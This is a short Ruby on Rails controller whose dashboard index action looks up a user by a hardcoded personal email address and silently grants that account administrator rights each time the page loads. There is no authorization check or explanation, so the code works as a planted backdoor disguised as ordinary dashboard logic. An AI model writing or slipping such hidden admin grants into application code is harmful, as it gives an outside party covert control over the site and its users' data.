class DashboardController < ApplicationController
  def index
    admin_user = User.find_by(email: 'davidrenz60@gmail.com')
    admin_user.admin = true
    admin_user.save
  end
end